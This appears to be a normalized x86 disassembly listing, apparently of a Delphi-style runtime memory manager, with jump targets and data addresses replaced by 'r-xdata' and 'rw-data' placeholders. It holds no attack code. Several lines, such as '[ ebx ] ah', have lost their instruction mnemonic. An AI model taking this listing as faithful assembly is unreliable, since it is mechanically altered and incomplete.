sub_40149c
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_4014e8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_40150c
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x30 ] ecx
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_401538
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x38 ] ecx
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_401568
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
fild [ eax + 0x38 ]
mov ecx [ eax + 0x40 ]
mov [ edx + 0x40 ] ecx
fistp [ edx + 0x38 ]
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4015a0
sub ecx 0xc
add eax ecx
add edx ecx
neg ecx
jns r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
mov eax [ ecx + eax + 0x8 ]
mov [ ecx + edx + 0x8 ] eax
retn
fild [ ecx + eax ]
fild [ ecx + eax + 0x8 ]
fistp [ ecx + edx + 0x8 ]
fistp [ ecx + edx ]
add ecx 0x10
js r-xdata
sub_4015ec
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp ecx edx
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
retn
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
retn
sub_40162c
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
lea ecx [ edx * 8 + rw-data ]
mov edx [ ecx + 0x4 ]
cmp edx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ ecx + 0x4 ] eax
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0x1
shl eax cl
or [ edx * 4 + rw-data ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
retn
retn
sub_40168c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test [ eax - 0x4 ] 0x1
jne r-xdata
retn
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
cmp edx 0xb30
jb r-xdata
or [ eax - 0x4 ] 0x8
mov edx [ rw-data ]
sub eax edx
mov ecx [ rw-data ]
sub eax ecx
add edx ecx
jmp r-xdata
call sub_4015ec
mov eax [ rw-data ]
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
retn
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jae sub_40162c
sub_4016f8
push ebx
mov ebx eax
call sub_40168c
push 0x4
push 0x1000
push 0x13fff0
push 0x0
call sub_4013e0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov ecx eax
mov [ ecx ] rw-data
mov [ rw-data ] eax
mov [ ecx + 0x4 ] edx
mov [ edx ] eax
mov edx eax
add edx 0x13fff0
mov ecx edx
sub ecx 0x4
mov [ ecx ] 0x2
mov ecx 0x13ffe0
sub ecx ebx
mov [ rw-data ] ecx
sub edx ebx
mov eax edx
mov [ rw-data ] eax
or ebx 0x2
mov edx eax
sub edx 0x4
mov [ edx ] ebx
pop ebx
retn
sub_401770
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp r-xdata
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_401460
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_4013f0
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_401460
test al al
je r-xdata
push 0xa
call sub_4013f0
sub_4018c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov edi eax
mov eax edi
sub eax 0x4
mov eax [ eax ]
mov ebx eax
and ebx 0xfffffff0
sub ebx 0x14
cmp ebx esi
jae r-xdata
shr ebx 0x1
cmp esi ebx
jb r-xdata
mov edx ebx
shr edx 0x2
add edx ebx
cmp edx esi
jbe r-xdata
mov eax esi
call sub_401a0c
mov ebx eax
test ebx ebx
je r-xdata
mov ebx edi
sub edi 0x10
mov [ edi + 0x8 ] esi
jmp r-xdata
mov ebp esi
mov ebp edx
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi 0x40a2c
jbe r-xdata
mov eax ebp
call sub_401a0c
mov ebx eax
test ebx ebx
je r-xdata
and [ esp + 0x10 ] 0xffff0000
mov edx esi
sub edx ebx
mov eax [ esp + 0x10 ]
cmp edx eax
jae r-xdata
mov edx edi
sub edx 0x10
and eax 0xfffffff0
add edx eax
mov [ esp ] edx
push 0x1c
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
call sub_401374
cmp [ esp + 0x14 ] 0x10000
jne r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_4015d0
mov eax edi
call sub_401d90
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
cmp ebp 0x40a2c
jbe r-xdata
mov edx ebp
sub edx ebx
add edx 0x10000
dec edx
and edx 0xffff0000
mov ebx edx
cmp eax ebx
jae r-xdata
mov eax edi
sub eax 0x10
mov eax [ eax + 0x8 ]
mov edx ebx
mov ecx edi
xchg ecx eax
call sub_4015a0
mov eax edi
call sub_401d90
jmp r-xdata
mov eax ebx
sub eax 0x10
mov [ eax + 0x8 ] esi
push 0x4
push 0x2000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_4013e0
test eax eax
je r-xdata
mov ebx eax
push 0x4
push 0x1000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_4013e0
test eax eax
je r-xdata
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
mov edx eax
add ebx [ edx + 0xc ]
or ebx 0x8
mov [ edx + 0xc ] ebx
mov ebx edi
jmp r-xdata
sub_401a0c
lea edx [ eax + 0x3 ]
shr edx 0x3
cmp eax 0xa2c
push ebx
mov cl [ rw-data ]
ja r-xdata
cmp eax 0x40a2c
ja r-xdata
test cl cl
movzx eax [ edx + rw-data ]
lea ebx [ eax * 8 + rw-data ]
jne r-xdata
pop ebx
test eax eax
jns r-xdata
lea ebx [ eax + 0xd3 ]
and ebx 0xffffff00
add ebx 0x30
test cl cl
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx 0xfffffff8
cmp edx ebx
je r-xdata
push ebx
push esi
push edi
push ebp
mov ebp eax
lea esi [ ebp + 0x10010 ]
dec esi
add esi 0x4
and esi 0xffff0000
push 0x4
push 0x101000
push esi
push 0x0
call sub_4013e0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
and eax [ edx * 4 + rw-data ]
je r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x10 ]
movzx ecx [ ebx + 0x2 ]
add ecx eax
cmp eax [ ebx + 0xc ]
ja r-xdata
add [ edx + 0xc ] 0x1
and ecx [ eax - 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ eax - 0x4 ] edx
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov [ edi + 0x8 ] ebp
or esi 0x4
mov [ edi + 0xc ] esi
call sub_401770
mov eax [ rw-data ]
mov [ edi ] rw-data
mov [ rw-data ] ebx
mov [ edi + 0x4 ] eax
mov [ eax ] ebx
mov [ rw-data ] 0x0
add ebx 0x10
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
add [ edx + 0xc ] 0x1
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ eax - 0x4 ] edx
pop ebx
retn
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] ebx
mov [ ebx + 0x4 ] ecx
mov [ ebx ] 0x0
pop ebx
retn
mov [ ebx ] 0x0
pop ebx
retn
push 0x0
call sub_4013f0
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ edx * 4 + rw-data ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
push esi
push edi
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ eax ] edi
cmp edi eax
jne r-xdata
sub ebx 0x40
pause
cmp [ rw-data ] 0x0
jne r-xdata
movsx esi [ ebx + 0x1 ]
and esi [ rw-data ]
je r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
push 0xa
call sub_4013f0
jmp r-xdata
mov eax ebx
call sub_4016f8
mov eax [ rw-data ]
sub eax ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
or ebx 0x2
mov [ eax - 0x4 ] ebx
jmp r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
push 0x0
call sub_4013f0
mov eax 0x100
[ ebx ] ah
je r-xdata
movzx ecx [ ebx + 0x18 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea esi [ eax * 8 ]
mov ecx [ eax * 4 + rw-data ]
bsf ecx ecx
lea ecx [ ecx + esi * 4 ]
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ edx ] edi
cmp edi edx
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
and [ edi + esi - 0x4 ] 0xf7
lea eax [ ebx + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
push 0xa
call sub_4013f0
jmp r-xdata
movzx eax [ ebx + 0x1a ]
mov edi eax
call sub_4016f8
mov esi eax
test eax eax
jne r-xdata
mov esi [ rw-data ]
movzx ecx [ ebx + 0x1a ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ eax * 4 + rw-data ] edx
jne r-xdata
push 0x0
call sub_4013f0
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea ecx [ ebx + 0x2 ]
mov [ esi - 0x4 ] ecx
mov [ rw-data ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_40162c
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ esi - 0x4 ] ecx
xor eax eax
mov [ rw-data ] al
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x10 ] esi
lea eax [ esi + 0x20 ]
movzx ecx [ ebx + 0x2 ]
lea edx [ ecx + eax ]
mov [ ebx + 0x8 ] edx
add edi esi
sub edi ecx
mov [ ebx + 0xc ] edi
mov [ ebx ] 0x0
mov [ eax - 0x4 ] esi
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] al
mov [ ebx ] al
pop edi
pop esi
pop ebx
retn
sub esi edi
sub [ rw-data ] edi
mov [ rw-data ] esi
jmp r-xdata
mov edi ecx
and [ edi + esi - 0x4 ] 0xf7
mov edx edi
movzx edi [ ebx + 0x1a ]
sub edx edi
lea eax [ edi + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
call sub_40162c
jmp r-xdata
btr [ rw-data ] eax
push 0xa
call sub_4013f0
jmp r-xdata
sub_401d90
mov edx [ eax - 0x4 ]
test dl 0x7
mov ecx eax
push ebx
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov ebx [ edx ]
jne r-xdata
pop ebx
test dl 0x3
je r-xdata
and edx 0xfffffff0
test bl bl
mov ebx edx
push esi
mov esi eax
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
sub [ edx + 0xc ] 0x1
mov eax [ edx + 0x8 ]
je r-xdata
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi eax
sub esi 0x10
call sub_401770
mov eax esi
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0xc ]
test dl 0x8
jne r-xdata
mov eax 0xffffffff
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ ebx + esi - 0x4 ] 0x1
mov ecx [ ebx + esi - 0x4 ]
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
test eax eax
je r-xdata
test eax eax
mov [ edx + 0x8 ] ecx
lea eax [ eax + 0x1 ]
mov [ ecx - 0x4 ] eax
je r-xdata
mov ebx esi
mov ebp edx
and ebp 0xfffffff0
xor edi edi
push 0x8000
push 0x0
push esi
call sub_4013e8
test eax eax
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebx + esi ]
and ecx 0xfffffff0
add ebx ecx
cmp ecx 0xb30
jb r-xdata
or ecx 0x8
mov [ ebx + esi - 0x4 ] ecx
push ecx
push edx
push 0x0
call sub_4013f0
pop edx
pop ecx
mov eax 0x100
[ ebx ] ah
je r-xdata
mov [ ebx + 0xc ] eax
mov eax [ edx + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x14 ] eax
xor eax eax
cmp [ ebx + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edx + 0x14 ] ebx
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x14 ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx ] 0x0
xor eax eax
pop ebx
retn
xor eax eax
mov [ ebx ] al
pop ebx
retn
mov esi [ esp + 0x14 ]
cmp ebp esi
jbe r-xdata
or edi 0xffffffff
jmp r-xdata
or edi 0xffffffff
jmp r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_4013f0
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ esi - 0x4 ] 0x8
jne r-xdata
call sub_4015ec
jmp r-xdata
mov ecx [ esi - 0x8 ]
sub esi ecx
add ebx ecx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13ffe0
je r-xdata
push ecx
push edx
push 0xa
call sub_4013f0
pop edx
pop ecx
jmp r-xdata
mov [ ebx ] al
mov eax edx
mov edx [ edx - 0x4 ]
mov bl [ rw-data ]
jmp r-xdata
test edi edi
jne r-xdata
sub ebp esi
add ebx esi
jmp r-xdata
push 0xa
call sub_4013f0
jmp r-xdata
mov eax esi
call sub_4015ec
jmp r-xdata
cmp [ rw-data ] 0x13ffe0
jne r-xdata
lea eax [ ebx + 0x3 ]
mov [ esi - 0x4 ] eax
mov [ ebx + esi - 0x8 ] ebx
mov eax esi
mov edx ebx
call sub_40162c
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax edi
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp ]
mov [ eax ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
push 0x1c
lea eax [ esp + 0xc ]
push eax
push ebx
call sub_401374
push 0x8000
push 0x0
push ebx
call sub_4013e8
test eax eax
jne r-xdata
lea ebx [ esi + 0x13ffe0 ]
call sub_40168c
mov [ ebx - 0x4 ] 0x2
mov [ rw-data ] 0x13ffe0
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub esi 0x10
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ rw-data ] 0x0
push 0x8000
push 0x0
push esi
call sub_4013e8
cmp eax 0x1
sbb eax eax
pop esi
pop ebx
retn
sub_401f88
mov ecx [ eax - 0x4 ]
test cl 0x7
push ebx
push esi
mov esi eax
jne r-xdata
test cl 0x5
jne r-xdata
mov ebx [ ecx ]
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
cmp ecx edx
jb r-xdata
pop esi
pop ebx
test cl 0x3
je sub_4018c0
mov ebx ecx
and ecx 0xfffffff0
push edi
lea edi [ ecx + eax ]
sub ecx 0x4
and ebx 0xf
cmp edx ecx
push ebp
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
push edi
mov edi edx
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
call sub_401a0c
test eax eax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
retn
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
lea ebp [ edx + edx ]
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi 0x40a2c
jbe r-xdata
mov ebx edx
mov eax edx
call sub_401a0c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
add eax edx
mov ebp eax
mov edi ecx
push edx
call sub_401a0c
pop edx
test eax eax
je r-xdata
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
cmp edx 0xb2c
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
mov edx eax
mov edi eax
mov eax esi
call [ ebx + 0x1c ]
mov eax esi
call sub_401d90
mov eax edi
mov [ eax - 0x8 ] edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx eax
mov ebx eax
mov eax esi
call sub_4015d0
mov eax esi
call sub_401d90
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp 0x40a2c
jbe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ebp [ edx + 0xd3 ]
and ebp 0xffffff00
add ebp 0x30
add ecx 0x4
sub ecx ebp
cmp [ rw-data ] 0x0
je r-xdata
cmp edx 0x2cc
jb r-xdata
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_4015a0
mov eax esi
call sub_401d90
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ eax - 0x8 ] edx
cmp eax 0xb30
jb r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebx ebp
mov [ esi - 0x4 ] ebx
mov ebx ecx
mov edx [ edi - 0x4 ]
test dl 0x1
jne r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov edi edx
mov eax edx
call sub_401a0c
test eax eax
je r-xdata
mov edx 0xb2c
cmp ecx edx
jbe r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd3 ]
and eax 0xffffff00
add eax 0x30
lea edx [ ebp + 0x4 ]
sub edx eax
ja r-xdata
mov eax edi
push ecx
push edx
call sub_4015ec
pop edx
pop ecx
mov ebx 0xf
and ebx [ esi - 0x4 ]
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax edi
and edx 0xfffffff0
add ebx edx
add edi edx
cmp edx 0xb30
jb r-xdata
or edx 0x8
mov [ edi - 0x4 ] edx
jmp r-xdata
mov ebx 0xf
and ebx [ esi - 0x4 ]
pause
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_4015d0
mov eax esi
call sub_401d90
mov eax ebp
mov [ esi + ebp - 0x4 ] edx
lea edi [ edx + 0x3 ]
mov [ eax + esi - 0x4 ] edi
mov ebp eax
cmp edx 0xb30
jb r-xdata
and [ esi + ebp ] 0xfffffff7
add ebp 0x4
jmp r-xdata
mov [ rw-data ] 0x0
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
push ecx
push edx
push 0x0
call sub_4013f0
pop edx
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov [ edi - 0x8 ] ebx
lea eax [ ebx + 0x3 ]
mov [ esi + ebp - 0x4 ] eax
cmp ebx 0xb30
jb r-xdata
call sub_4015ec
push ecx
push 0x0
call sub_4013f0
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebp ebx
mov [ esi - 0x4 ] ebp
mov [ rw-data ] 0x0
mov eax esi
add eax esi
call sub_40162c
push ecx
push edx
push 0xa
call sub_4013f0
pop edx
pop ecx
jmp r-xdata
mov [ rw-data ] 0x0
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + ebp ]
mov edx ebx
call sub_40162c
push ecx
push 0xa
call sub_4013f0
pop ecx
jmp r-xdata
sub_4022a0
push ebx
lea ebx [ eax - 0x1 ]
and ebx 0xfffffffc
call sub_401a0c
cmp eax 0x1
sbb ecx ecx
lea edx [ ebx + eax ]
or ebx ecx
cmp ebx 0x40a2c
jae r-xdata
pop ebx
retn
neg ebx
fldz
fst [ ebx + edx ]
add ebx 0x8
js r-xdata
mov [ edx ] ecx
ffree st0
sub_4022d0
mov ecx eax
mov edx ecx
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
add edx ecx
mov eax edx
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor eax eax
sub_4022f4
cmp [ rw-data ] 0x0
je r-xdata
add eax 0x10
retn
mov edx [ rw-data ]
cmp edx eax
jb r-xdata
mov edx eax
add edx 0x13fff0
cmp edx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x13ffe0
je r-xdata
xor eax eax
mov eax [ rw-data ]
jmp r-xdata
retn
sub_402334
push ebx
push esi
mov ebx eax
add ebx 0x20
mov [ edx ] ebx
mov edx [ eax ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov ebx esi
sub ebx 0x4
mov ebx [ ebx ]
and ebx 0xfffffff0
add ebx esi
movzx eax [ edx + 0x2 ]
sub ebx eax
mov [ ecx ] ebx
pop esi
pop ebx
retn
mov ebx [ edx + 0x8 ]
cmp ebx [ edx + 0xc ]
jbe r-xdata
mov eax [ edx + 0x8 ]
dec eax
mov [ ecx ] eax
pop esi
pop ebx
retn
sub_402370
push edi
mov edi edx
add eax 0x1
mov edx 0x89705f41
mul edx
shr eax 0x1e
mov ecx edx
and edx 0x1fffffff
shr ecx 0x1d
lea edx [ edx + edx * 4 ]
add edx eax
mov eax ecx
or eax 0x30
mov [ edi ] al
mov eax edx
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1c
and edx 0xfffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1b
and edx 0x7ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1a
and edx 0x3ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x19
and edx 0x1ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x18
and edx 0xffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x17
and edx 0x7fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x16
and edx 0x3fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x15
and edx 0x1fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x14
or eax 0x30
mov [ edi ] al
lea eax [ edi + 0x1 ]
pop edi
retn
sub_4024a4
push ebp
mov ebp esp
push ebx
mov edx eax
cmp edx 0xffff
jbe r-xdata
xor eax eax
test dl 0x3
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx eax
cmp edx ecx
ja r-xdata
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx - 0x10 ] ecx
push 0x1c
mov edx [ ebp + 0x8 ]
add edx 0xffffffe4
push edx
push eax
call sub_401374
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
add edx [ ebx - 0x10 ]
add ecx 0x4
cmp edx ecx
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x1000
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x4
jb r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
test [ eax - 0x8 ] 0xf6
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x7 ] 0x1
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_402520
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp edi 0x3e8
jge r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffb4
call sub_4024a4
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffdc
call sub_4024a4
pop ecx
test al al
je r-xdata
mov eax ebx
add eax 0xffffffdc
mov esi [ eax ]
mov eax ebx
add eax 0xffffffb4
cmp ebx [ eax ]
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4024a4
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ edi + 0x1 ]
mov eax [ esi ]
call sub_402520
pop ecx
test al al
jne r-xdata
sub_4025a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
push ebp
xor edx edx
mov eax ebx
call sub_402520
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
sub_4025c8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
retn
push 0x4
push 0x1000
push 0x10000
push 0x0
call sub_4013e0
mov [ rw-data ] eax
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_401460
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_4013f0
mov ecx rw-data
mov dl 0x1
